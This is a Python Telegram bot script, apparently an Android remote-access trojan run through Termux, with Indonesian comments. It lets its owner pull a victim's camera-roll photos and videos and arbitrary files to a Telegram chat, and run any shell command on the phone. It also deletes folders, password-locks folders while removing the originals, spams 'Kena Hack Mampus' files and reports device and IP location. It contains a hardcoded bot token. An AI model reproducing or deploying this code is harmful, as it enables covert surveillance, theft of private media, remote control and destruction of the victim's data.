import telebot
import pyminizip
import zipfile
import shutil
import os
import random
import subprocess
import re
import string
import platform
import requests
import json

BOT_TOKEN = '7946256405:AAERBAEQ5GXmiYtcVc2FWUU6pRywwczTXIc'
OWNER_ID = 6315300476

bot = telebot.TeleBot(BOT_TOKEN)

galeri_index = {}  # Menyimpan ID file untuk akses cepat

def is_owner(message):
    return message.chat.id == OWNER_ID

def escape_md(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)

# 1. Buat 100 Folder
@bot.message_handler(commands=['buatfolder'])
def buat_folder_batch(message):
    if is_owner(message):
        try:
            base_path = "/sdcard/Kena Hack Bang"
            for i in range(1, 101):
                folder_path = f"{base_path}_{i}"
                if not os.path.exists(folder_path):
                    os.makedirs(folder_path)
            bot.send_message(message.chat.id, "✅ 100 FOLDER BERHASIL DIBUAT🤯📁!")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Gagal membuat folder: {escape_md(str(e))}", parse_mode="MarkdownV2")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")



#hapus folder
@bot.message_handler(commands=['hapusfolder'])
def hapus_folder(message):
    if is_owner(message):
        try:
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                bot.send_message(message.chat.id, "⚠️ Format salah!\nGunakan: `/hapusfolder /path/folder`", parse_mode='Markdown')
                return

            path = args[1].strip()

            if os.path.exists(path) and os.path.isdir(path):
                os.system(f'rm -rf "{path}"')
                bot.send_message(message.chat.id, f"🗑️ Folder berhasil dihapus:\n`{path}`", parse_mode='Markdown')
            else:
                bot.send_message(message.chat.id, f"❌ Folder tidak ditemukan:\n`{path}`", parse_mode='Markdown')
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Gagal menghapus folder:\n`{e}`", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")#hapus folder

#Fitur Upload
@bot.message_handler(commands=['upload'])
def handle_upload(message):
    if message.reply_to_message and message.reply_to_message.document:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        file_name = message.reply_to_message.document.file_name
        downloaded_file = bot.download_file(file_info.file_path)

        # Lokasi penyimpanan korban
        save_path = f"/sdcard/Download/{file_name}"
        with open(save_path, 'wb') as f:
            f.write(downloaded_file)

        bot.reply_to(message, f"✅ File disimpan di {save_path}")
    else:
        bot.reply_to(message, "❌ Reply ke file dengan /upload")

# 2. Kirim Daftar Galeri (Foto & Video)
@bot.message_handler(commands=['galeri'])
def kirim_daftar_galeri(message):
    if is_owner(message):
        path = "/sdcard/DCIM/Camera"
        try:
            files = [f for f in os.listdir(path) if f.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov'))]

            if not files:
                bot.send_message(message.chat.id, "📁 Tidak ada file media di galeri.")
                return

            galeri_index.clear()
            pesan = ""
            count = 0

            for f in sorted(files, reverse=True):
                fid = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
                galeri_index[fid] = f

                safe_filename = escape_md(f)
                pesan += f"📎 {safe_filename} — ID: `{fid}`\n"
                count += 1

                if count % 40 == 0:
                    bot.send_message(message.chat.id, pesan, parse_mode="MarkdownV2")
                    pesan = ""

            if pesan:
                bot.send_message(message.chat.id, pesan, parse_mode="MarkdownV2")

            bot.send_message(message.chat.id, f"📸 Total file: {len(files)}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {escape_md(str(e))}", parse_mode="MarkdownV2")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# 3. Ambil file galeri berdasarkan ID
@bot.message_handler(commands=['getfile'])
def get_file_by_id(message):
    if not is_owner(message):
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
        return

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "❗ Gunakan format: /getfile <file_id>")
            return

        file_id = args[1]

        if file_id not in galeri_index:
            bot.send_message(message.chat.id, "❗ ID file tidak ditemukan.")
            return

        filename = galeri_index[file_id]
        filepath = os.path.join("/sdcard/DCIM/Camera", filename)

        if not os.path.isfile(filepath):
            bot.send_message(message.chat.id, "❗ File tidak ditemukan.")
            return

        ext = filename.lower().split('.')[-1]

        if ext in ['jpg', 'jpeg', 'png']:
            with open(filepath, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, timeout=60)

        elif ext in ['mp4', 'mov']:
            with open(filepath, 'rb') as video:
                bot.send_video(message.chat.id, video, timeout=60)

        else:
            with open(filepath, 'rb') as doc:
                bot.send_document(message.chat.id, doc, timeout=60)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: `{e}`", parse_mode="Markdown")
# 4. Putar Musik MP3 di folder Music
@bot.message_handler(commands=['playmusik'])
def play_musik(message):
    if is_owner(message):
        try:
            last_played_path = "/data/data/com.termux/files/home/last_played.txt"

            # Baca lagu terakhir yang diputar
            if os.path.exists(last_played_path):
                with open(last_played_path, "r") as f:
                    last_played = f.read().strip()
            else:
                last_played = ""

            for root, dirs, files in os.walk("/sdcard"):
                for file in files:
                    if file.endswith(".mp3") and file != last_played:
                        full_path = os.path.join(root, file)
                        os.system(f'play-audio "{full_path}"')
                        bot.send_message(message.chat.id, f"🎵 Memutar:\n{file}\n📂 Lokasi: {root}")

                        # Simpan file ini sebagai terakhir diputar
                        with open(last_played_path, "w") as f:
                            f.write(file)
                        return

            bot.send_message(message.chat.id, "🎵 Tidak ditemukan file musik baru.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Gagal: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
# 6. Ls Daftar Penyimpanan
@bot.message_handler(commands=['ls'])
def ls_command(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
        return

    # Ambil argumen path setelah /ls
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❗ Gunakan: /ls <path>")
        return

    path = parts[1]

    if not os.path.exists(path):
        bot.send_message(message.chat.id, f"❗ Folder tidak ditemukan: {path}")
        return

    if not os.path.isdir(path):
        bot.send_message(message.chat.id, f"❗ Bukan folder: {path}")
        return

    try:
        files = os.listdir(path)
        if not files:
            bot.send_message(message.chat.id, f"📁 Folder kosong: {path}")
            return

        hasil = f"📂 Isi folder {path}:\n"
        for f in files:
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                hasil += f"📁 {f}/\n"
            else:
                hasil += f"📄 {f}\n"

        # Kirim tanpa parse_mode
        bot.send_message(message.chat.id, hasil)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

#Kunci Folder
@bot.message_handler(commands=['lockfolder'])
def lock_folder(message):
    try:
        args = message.text.split(" ", 2)
        if len(args) < 3:
            return bot.reply_to(message, "❗ Format: /lockfolder <path> <password>")

        target_path = args[1]
        password = args[2]

        if not os.path.exists(target_path):
            return bot.reply_to(message, "❌ Path tidak ditemukan.")

        zip_path = target_path + "_locked.zip"

        if os.path.isdir(target_path):
            shutil.make_archive("temp_folder", 'zip', target_path)
            os.rename("temp_folder.zip", "temp.zip")
            pyminizip.compress("temp.zip", None, zip_path, password, 5)
            os.remove("temp.zip")
            shutil.rmtree(target_path)
        else:
            pyminizip.compress(target_path, None, zip_path, password, 5)
            os.remove(target_path)

        bot.reply_to(message, f"✅ Berhasil dikunci 🔐\n📁 {zip_path}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")
#buka folder
@bot.message_handler(commands=['unlockfolder'])
def unlock_folder(message):
    try:
        args = message.text.split(" ", 2)
        if len(args) < 3:
            return bot.reply_to(message, "❗ Format: /unlockfolder <zip_path> <password>")

        zip_path = args[1]
        password = args[2]

        if not os.path.exists(zip_path):
            return bot.reply_to(message, "❌ ZIP tidak ditemukan.")

        output_path = zip_path.replace("_locked.zip", "_unlocked")
        os.makedirs(output_path, exist_ok=True)

        result = os.system(f'unzip -P "{password}" "{zip_path}" -d "{output_path}"')

        if result != 0:
            return bot.reply_to(message, "❌ Password salah atau unzip gagal.")

        os.remove(zip_path)
        bot.reply_to(message, f"✅ Berhasil dibuka 🔓\n📂 {output_path}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")

#bikin file

@bot.message_handler(commands=['spamfile'])
def spam_file(message):
    if is_owner(message):
        try:
            parts = message.text.split()
            if len(parts) == 2 and parts[1].isdigit():
                jumlah = int(parts[1])
                if jumlah > 1000:
                    bot.send_message(OWNER_ID, "❗ Batas maksimal 1000 file ya bro 😅")
                    return
            else:
                jumlah = 10  # default kalau gak kasih angka

            folder_path = "/sdcard/HackMampus"
            os.makedirs(folder_path, exist_ok=True)

            for i in range(jumlah):
                file_path = os.path.join(folder_path, f"Kenak_Hack_Mampus_{i+1}.txt")
                with open(file_path, "w") as f:
                    f.write("Kena Hack Mampus")

            bot.send_message(OWNER_ID, f"✅ {jumlah} FILE BERHASIL DI BUAT📁:\n📂 {folder_path}")
        except Exception as e:
            bot.send_message(OWNER_ID, f"❌ Error saat buat file: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak, hanya owner yang bisa pakai perintah ini.")

#Fitur Run
@bot.message_handler(commands=['run'])
def run_command(message):
    if is_owner(message):
        try:
            command = message.text[len('/run '):]  # Ambil teks setelah "/run "
            output = os.popen(command).read()[:4000]  # Batasin output biar nggak terlalu panjang
            if not output:
                output = "✅ Perintah dijalankan, tapi tidak ada output."
            bot.send_message(message.chat.id, f"💻 Output:\n{output}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
#Fitur getapk
@bot.message_handler(commands=['getapk'])
def get_apk(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Gunakan: /getapk nama_apk.apk")
        return

    apk_name = args[1]
    apk_path = f"/sdcard/Download/{apk_name}"

    if os.path.exists(apk_path):
        with open(apk_path, 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.reply_to(message, "❌ APK tidak ditemukan di /sdcard/Download/")

#Fitur Get Zip
@bot.message_handler(commands=['getzip'])
def get_zip(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Gunakan: /getzip /path/file.zip")
        return

    zip_path = args[1]
    if os.path.exists(zip_path) and zip_path.endswith(".zip"):
        with open(zip_path, 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.reply_to(message, "❌ File ZIP tidak ditemukan atau bukan .zip")

#Fitur Getmedia
@bot.message_handler(commands=['getmedia'])
def get_media(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Gunakan: /getmedia /path/file")
        return

    media_path = args[1]

    if not os.path.exists(media_path):
        bot.reply_to(message, "❌ File media tidak ditemukan")
        return

    ext = os.path.splitext(media_path)[1].lower()

    try:
        if ext in ['.jpg', '.jpeg', '.png', '.webp']:
            with open(media_path, 'rb') as f:
                bot.send_photo(message.chat.id, f)
        elif ext in ['.mp4', '.mkv', '.avi']:
            with open(media_path, 'rb') as f:
                bot.send_video(message.chat.id, f)
        elif ext in ['.mp3', '.wav', '.ogg']:
            with open(media_path, 'rb') as f:
                bot.send_audio(message.chat.id, f)
        else:
            with open(media_path, 'rb') as f:
                bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Gagal mengirim: {str(e)}")

#fitur deviceinfo

@bot.message_handler(commands=['deviceinfo'])
def device_info(message):
    if is_owner(message):
        try:
            import platform
            info = platform.uname()
            system_info = f"""📱 *Device Info*
🖥️ System: {info.system}
🔧 Node: {info.node}
💽 Release: {info.release}
📦 Version: {info.version}
🧠 Machine: {info.machine}
💻 Processor: {info.processor}
"""

            try:
                import requests
                ip_data = requests.get("https://ipinfo.io/json", timeout=10).json()
                ip_info = f"""
🌐 *IP Info*
📡 IP: {ip_data.get("ip", "Unknown")}
📍 City: {ip_data.get("city", "Unknown")}
🌎 Region: {ip_data.get("region", "Unknown")}
🌍 Country: {ip_data.get("country", "Unknown")}
🧭 Loc: {ip_data.get("loc", "Unknown")}
🔢 ISP: {ip_data.get("org", "Unknown")}
"""
            except Exception as e:
                ip_info = "\n⚠️ Gagal ambil IP info."

            bot.send_message(message.chat.id, system_info + ip_info, parse_mode='Markdown')
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Error ambil info perangkat: {e}")
# 7. Start command info
@bot.message_handler(commands=['start'])
def start(message):
    if is_owner(message):
        bot.send_message(OWNER_ID, "👨‍💻🌍 RayyBot aktif. Gunakan perintah:\n/deviceinfo💻🌍\n/hapusfolder📁\n/upload\n/buatfolder📁\n/galeri📸\n/getfile📂 📸 <id>\n/playmusik🎶🎧\n/ls📂\n/lockfolder🔐\n/unlockfile🔓🔑\n/getapk\n/getmedia\n/getzip\n/spamfile📂🤯\n/run👨‍💻")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# Run bot
bot.polling()
